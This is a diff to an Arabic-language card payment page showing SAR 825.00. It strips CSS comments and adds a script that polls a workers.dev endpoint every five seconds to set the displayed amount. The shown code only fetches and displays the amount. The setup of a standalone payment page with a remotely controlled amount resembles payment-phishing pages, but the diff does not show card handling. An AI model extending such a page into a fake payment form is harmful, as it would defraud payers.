@@ -37,7 +37,7 @@ html,body{
 .amount-value{
   text-align:center;
   font-size:32px;
-  font-weight:900; /* كان 700 */
+  font-weight:900;
   direction:ltr;
   margin-bottom:32px;
 }
@@ -98,7 +98,7 @@ html,body{
   width:130px;
   height:37px;
   display:flex;
-  align-items:flex-start; /* رفعه لفوق */
+  align-items:flex-start;
   justify-content:center;
 }
 
@@ -107,8 +107,7 @@ html,body{
   height:37px;
   width:auto;
   object-fit:contain;
-  transform: translateY(-4px); /* رفع إضافي بسيط */
-
+  transform: translateY(-4px);
   background:none;
   border:none;
   box-shadow:none;
@@ -148,7 +147,7 @@ html,body{
 <div class="page">
 
   <div class="amount-title">المبلغ</div>
-  <div class="amount-value">SAR 825.00</div>
+  <div class="amount-value" id="topAmount">SAR 825.00</div>
 
   <div class="divider">
     <span>ادفع عن طريق البطاقة</span>
@@ -183,9 +182,35 @@ html,body{
 
   </div>
 
-  <button class="pay-btn">ادفع SAR 825.00</button>
+  <button class="pay-btn" id="payBtn">ادفع SAR 825.00</button>
 
 </div>
 
+<script>
+const API_URL = "https://snowy-bread-61bc.aefoon2030.workers.dev/";
+
+function normalizeAmountText(value) {
+  if (!value) return "SAR 825.00";
+  return value;
+}
+
+async function loadAmount() {
+  try {
+    const res = await fetch(API_URL, { cache: "no-store" });
+    const data = await res.json();
+
+    const amount = normalizeAmountText(data.amount);
+
+    document.getElementById("topAmount").textContent = amount;
+    document.getElementById("payBtn").textContent = "ادفع " + amount;
+  } catch (err) {
+    console.log("تعذر تحميل المبلغ", err);
+  }
+}
+
+loadAmount();
+setInterval(loadAmount, 5000);
+</script>
+
 </body>
-</html>
+    </html>
